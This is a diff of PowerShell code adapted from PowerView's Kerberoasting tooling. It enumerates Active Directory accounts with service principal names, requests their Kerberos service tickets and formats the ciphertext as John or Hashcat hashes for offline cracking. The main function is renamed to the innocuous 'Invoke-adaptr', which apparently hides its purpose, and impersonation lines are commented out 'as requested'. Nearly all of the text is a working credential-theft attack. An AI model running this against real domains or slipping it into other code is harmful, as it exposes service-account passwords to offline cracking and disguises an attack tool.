@@ -1,110 +1,93 @@
-function Get-DomainSearcher {
-    <# .SYNOPSIS Returns a System.DirectoryServices.DirectorySearcher object #>
+function Invoke-adaptr {
+
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [OutputType('PowerView.SPNTicket')]
     [CmdletBinding()]
     Param(
-        [String]$Domain,
-        [String[]]$Properties = @(),
-        [String]$SearchBase,
-        [String]$Server,
-        [String]$SearchScope,
-        [Int]$ResultPageSize,
-        [Int]$ServerTimeLimit,
-        [String]$SecurityMasks,
-        [Switch]$Tombstone,
-        [Management.Automation.PSCredential]$Credential
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
+        [String[]]
+        $Identity,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Domain,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('Filter')]
+        [String]
+        $LDAPFilter,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('ADSPath')]
+        [String]
+        $SearchBase,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('DomainController')]
+        [String]
+        $Server,
+
+        [ValidateSet('Base', 'OneLevel', 'Subtree')]
+        [String]
+        $SearchScope = 'Subtree',
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $ResultPageSize = 200,
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $ServerTimeLimit,
+
+        [Switch]
+        $Tombstone,
+
+        [ValidateSet('John', 'Hashcat')]
+        [Alias('Format')]
+        [String]
+        $OutputFormat = 'Hashcat',
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
-    
-    $Global:DefaultSearchBase = "DC=local" # Placeholder for a default domain base
-    if ($Domain) {
-        $SearchBase = "DC=$($Domain -replace '\.', ',DC=')"
-    } elseif (-not $SearchBase) {
-        $SearchBase = $Global:DefaultSearchBase
-    }
 
-    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
-    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
-    $Searcher.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
-    
-    # Apply parameters where possible
-    if ($Properties.Count -gt 0) { $Searcher.PropertiesToLoad.AddRange($Properties) }
-    if ($SearchScope) { $Searcher.SearchScope = $SearchScope }
-    if ($ResultPageSize) { $Searcher.PageSize = $ResultPageSize }
-    if ($ServerTimeLimit) { $Searcher.ServerTimeLimit = [System.TimeSpan]::FromSeconds($ServerTimeLimit) }
-    
-    # Tombstone requires an extra flag and a domain controller, simplified for this example
-    if ($Tombstone) {
-        $Searcher.SearchRoot.Properties["supportedcontrol"]
-        # Actual implementation requires complex logic (e.g., setting OID control)
-        Write-Warning "Tombstone search is complex and simplified here."
-    }
-
-    # Simplified security mask logic
-    if ($SecurityMasks) {
-        $Searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::$SecurityMasks
-    }
-
-    return $Searcher
-}
-
-function Convert-ADName {
-    <# .SYNOPSIS Translates AD names. Simplified. #>
-    [CmdletBinding()]
-    Param(
-        [String]$InputName,
-        [ValidateSet('Canonical')][String]$OutputType
-    )
-    # This is a very simple placeholder for demonstration.
-    # The original PowerView function is much more robust.
-    if ($InputName -like '*\*') {
-        return $InputName -replace '\\', '/'
-    }
-    return $InputName
-}
-
-function Convert-LDAPProperty {
-    <# .SYNOPSIS Converts raw LDAP property objects into PowerShell objects. Simplified. #>
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory=$true)]
-        [Object]$Properties
-    )
-    
-    $OutputObject = New-Object PSObject
-    foreach ($Property in $Properties.PropertyNames) {
-        $Value = $Properties[$Property].Value
-        
-        # Simple type conversion placeholder for illustration
-        if ($Value -is [System.DirectoryServices.ResultPropertyValueCollection] -and $Value.Count -eq 1) {
-            $Value = $Value[0]
+    BEGIN {
+        $UserSearcherArguments = @{
+            'SPN' = $True
+            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
         }
-        
-        $OutputObject | Add-Member -MemberType NoteProperty -Name $Property -Value $Value
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
+
+        # The lines below are removed as requested:
+        # if ($PSBoundParameters['Credential']) {
+        #     $LogonToken = Invoke-UserImpersonation -Credential $Credential
+        # }
     }
-    return $OutputObject
+
+    PROCESS {
+        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
+        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
+    }
+
+    END {
+        # The lines below are removed as requested:
+        # if ($LogonToken) {
+        #     Invoke-RevertToSelf -TokenHandle $LogonToken
+        # }
+    }
 }
-
-# The userAccountControl enumeration values needed for the DynamicParam block
-# This is a minimal set to prevent a script error, as $UACEnum is undefined elsewhere.
-$Global:UACEnum = @{
-    'SCRIPT' = 1
-    'ACCOUNTDISABLE' = 2
-    'HOMEDIR_REQUIRED' = 8
-    'LOCKOUT' = 16
-    'PASSWORD_NOT_REQUIRED' = 32
-    'NORMAL_ACCOUNT' = 512
-    'DONT_REQ_PREAUTH' = 4194304
-    'TRUSTED_FOR_DELEGATION' = 524288
-    'NOT_DELEGATED' = 1048576
-} | Add-Member -MemberType ScriptProperty -Name UACEnum -PassThru -Force -Value { $Global:UACEnum }
-
-
----
 
 function Get-DomainUser {
-<#
-... [Original Help Content for Get-DomainUser] ...
-#>
-
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.User')]
@@ -118,7 +101,7 @@ function Get-DomainUser {
 
         [Switch]
         $SPN,
-        # ... other parameters ...
+
         [Switch]
         $AdminCount,
 
@@ -192,16 +175,11 @@ function Get-DomainUser {
     )
 
     DynamicParam {
-        # Use the global $UACEnum defined above
-        $UACValueNames = [System.Collections.ArrayList]::new($Global:UACEnum.Keys)
+        $UACValueNames = [Enum]::GetNames($UACEnum)
         # add in the negations
-        $UACValueNames | ForEach-Object { $UACValueNames.Add("NOT_$_") | Out-Null }
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
         # create new dynamic parameter
-        $UACParam = New-Object System.Management.Automation.RuntimeDefinedParameter('UACFilter', [String[]])
-        $UACParam.Attributes.Add((New-Object System.Management.Automation.ValidateSetAttribute($UACValueNames)))
-        $UACParamDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
-        $UACParamDictionary.Add('UACFilter', $UACParam)
-        return $UACParamDictionary
+        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
@@ -222,7 +200,7 @@ function Get-DomainUser {
     PROCESS {
         #bind dynamic parameter to a friendly variable
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            $UACFilter = $PSBoundParameters['UACFilter']
+            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
         }
 
         if ($UserSearcher) {
@@ -302,11 +280,11 @@ function Get-DomainUser {
             $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
-                    $UACValue = $Global:UACEnum.$UACField
+                    $UACValue = [Int]($UACEnum::$UACField)
                     $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
-                    $UACValue = $Global:UACEnum.$_
+                    $UACValue = [Int]($UACEnum::$_)
                     $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
@@ -338,12 +316,7 @@ function Get-DomainUser {
     }
 }
 
----
-
 function Get-DomainSPNTicket {
-<#
-... [Original Help Content for Get-DomainSPNTicket] ...
-#>
 
     [OutputType('PowerView.SPNTicket')]
     [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
@@ -370,9 +343,12 @@ function Get-DomainSPNTicket {
     )
 
     BEGIN {
-        # Load the required .NET assembly for Kerberos requests
-        $Null = [System.Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
-        # IMPERSONATION CODE REMOVED
+        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
+
+        # The lines below are removed as requested:
+        # if ($PSBoundParameters['Credential']) {
+        #     $LogonToken = Invoke-UserImpersonation -Credential $Credential
+        # }
     }
 
     PROCESS {
@@ -417,27 +393,27 @@ function Get-DomainSPNTicket {
                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
-                # REGEX to parse the encrypted ticket section (AS-REP-style)
                 if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                     $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                     $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                     $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
 
                     if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
-                        Write-Warning "Error parsing ciphertext for the SPN $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline."
+                        Write-Warning "Error parsing ciphertext for the SPN $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                         $Hash = $null
-                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([System.BitConverter]::ToString($TicketByteStream).Replace('-',''))
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                     } else {
                         $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                         $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                     }
                 } else {
-                    Write-Warning "Unable to parse ticket structure for the SPN $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline."
+                    Write-Warning "Unable to parse ticket structure for the SPN $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                     $Hash = $null
-                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([System.BitConverter]::ToString($TicketByteStream).Replace('-',''))
+                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                 }
 
                 if($Hash) {
+                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
                     if ($OutputFormat -match 'John') {
                         $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                     }
@@ -448,6 +424,8 @@ function Get-DomainSPNTicket {
                         else {
                             $UserDomain = 'UNKNOWN'
                         }
+
+                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
                         $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                     }
                     $Out | Add-Member Noteproperty 'Hash' $HashFormat
@@ -460,93 +438,9 @@ function Get-DomainSPNTicket {
     }
 
     END {
-        # IMPERSONATION CODE REMOVED
-    }
-}
-
----
-
-function Invoke-adaptr {
-
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerView.SPNTicket')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
-        [String[]]
-        $Identity,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Domain,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('Filter')]
-        [String]
-        $LDAPFilter,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('ADSPath')]
-        [String]
-        $SearchBase,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('DomainController')]
-        [String]
-        $Server,
-
-        [ValidateSet('Base', 'OneLevel', 'Subtree')]
-        [String]
-        $SearchScope = 'Subtree',
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ResultPageSize = 200,
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ServerTimeLimit,
-
-        [Switch]
-        $Tombstone,
-
-        [ValidateSet('John', 'Hashcat')]
-        [Alias('Format')]
-        [String]
-        $OutputFormat = 'Hashcat',
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
-    )
-
-    BEGIN {
-        $UserSearcherArguments = @{
-            'SPN' = $True
-            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
-        }
-        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
-        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
-        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
-        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
-        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
-        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
-        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
-        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
-        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
-
-        # Credential/Impersonation logic removed as requested.
-    }
-
-    PROCESS {
-        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-
-        # Main Kerberoasting logic
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
-    }
-
-    END {
-        # Credential/Impersonation logic removed as requested.
+        # The lines below are removed as requested:
+        # if ($LogonToken) {
+        #     Invoke-RevertToSelf -TokenHandle $LogonToken
+        # }
     }
 }
